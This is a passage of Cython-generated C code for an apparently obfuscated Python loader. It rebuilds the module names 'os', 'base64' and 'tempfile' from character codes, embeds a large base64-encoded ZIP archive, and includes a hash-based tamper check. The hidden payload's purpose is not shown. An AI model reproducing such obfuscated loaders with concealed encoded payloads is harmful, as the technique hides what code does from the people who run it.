  __pyx_builtin_map = __Pyx_GetBuiltinName(__pyx_n_s_map); if (!__pyx_builtin_map) __PYX_ERR(0, 7, __pyx_L1_error)
  __pyx_builtin_chr = __Pyx_GetBuiltinName(__pyx_n_s_chr); if (!__pyx_builtin_chr) __PYX_ERR(0, 7, __pyx_L1_error)
  __pyx_builtin___import__ = __Pyx_GetBuiltinName(__pyx_n_s_import); if (!__pyx_builtin___import__) __PYX_ERR(0, 8, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 20, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__2 = PyTuple_Pack(1, __pyx_kp_u_file_will_not_run_anymore_as_mai); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  
  __pyx_tuple__3 = PyTuple_Pack(2, __pyx_n_s_combined, __pyx_n_s_hashlib); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);
  __pyx_codeobj__4 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__3, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_lllllllllllllllllllllll, 30, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__4)) __PYX_ERR(0, 30, __pyx_L1_error)

  
  __pyx_tuple__5 = PyTuple_Pack(2, __pyx_n_s_lllllllllllllll, __pyx_n_s_llllllllllllllll); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 1927, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);
  __pyx_codeobj__6 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__5, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_llllllllllllll, 1927, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__6)) __PYX_ERR(0, 1927, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_46 = PyInt_FromLong(46); if (unlikely(!__pyx_int_46)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_52 = PyInt_FromLong(52); if (unlikely(!__pyx_int_52)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_54 = PyInt_FromLong(54); if (unlikely(!__pyx_int_54)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_97 = PyInt_FromLong(97); if (unlikely(!__pyx_int_97)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_98 = PyInt_FromLong(98); if (unlikely(!__pyx_int_98)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_101 = PyInt_FromLong(101); if (unlikely(!__pyx_int_101)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_102 = PyInt_FromLong(102); if (unlikely(!__pyx_int_102)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_105 = PyInt_FromLong(105); if (unlikely(!__pyx_int_105)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_108 = PyInt_FromLong(108); if (unlikely(!__pyx_int_108)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_109 = PyInt_FromLong(109); if (unlikely(!__pyx_int_109)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_112 = PyInt_FromLong(112); if (unlikely(!__pyx_int_112)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_114 = PyInt_FromLong(114); if (unlikely(!__pyx_int_114)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_115 = PyInt_FromLong(115); if (unlikely(!__pyx_int_115)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_116 = PyInt_FromLong(116); if (unlikely(!__pyx_int_116)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_121 = PyInt_FromLong(121); if (unlikely(!__pyx_int_121)) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4.tp_dictoffset && __pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 = &__pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  char const *__pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_4lambda, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lll, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5lambda1, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llll, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_llll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_115);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllll, __pyx_t_3) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_llll); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = PyList_New(6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_52);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllll, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_llll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_101);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllllll, __pyx_t_3) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_6lambda2, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllll, __pyx_t_3) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_7lambda3, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_8lambda4, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_9lambda6, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_10lambda7, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllllllllllllllll, __pyx_n_u_Shishya) < 0) __PYX_ERR(0, 25, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllllllllllllllllllll, __pyx_n_u_Kriyox) < 0) __PYX_ERR(0, 26, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllllllllllllllllll, __pyx_n_u_b9d4772332e9dcc5376f1869cf910fe4) < 0) __PYX_ERR(0, 27, __pyx_L1_error)

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1lllllllllllllllllllllll, 0, __pyx_n_s_lllllllllllllllllllllll, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__4)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllllllllllllllllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_lllllllllllll, __pyx_kp_u_UEsDBBQAAAAAABtlvVodb_QZ7rkBAO65) < 0) __PYX_ERR(0, 37, __pyx_L1_error)

  
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3llllllllllllll, 0, __pyx_n_s_llllllllllllll, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__6)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1927, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 1927, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  /*try:*/ {

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_lllllllllllllllllllllll); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1938, __pyx_L3_error)
